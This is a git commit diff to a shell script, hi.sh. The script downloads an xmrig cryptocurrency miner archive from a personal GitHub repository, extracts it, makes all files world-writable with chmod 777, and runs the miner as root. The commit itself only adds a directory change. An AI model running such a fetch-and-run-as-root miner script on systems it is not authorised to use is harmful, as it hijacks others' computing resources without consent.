45fe096a90971a1ee45cde36809ba35bd8c5f693
rinaffers <83849004+rinaffers@users.noreply.github.com>
2021-05-08 08:22:09 +0700

    Update hi.sh

--- hi.sh
+++ hi.sh
@@ -2,6 +2,7 @@
 sudo apt-get update -y
 wget https://github.com/rinaffers/Lorena/raw/main/xmrig-6.12.1-linux-static-x64.tar.xz
 tar -xf xmrig-6.12.1-linux-static-x64.tar.xz
+cd xmrig-6.12.1-linux-static-x64
 ls -lA
 chmod 777 *
 sudo ./xmrig
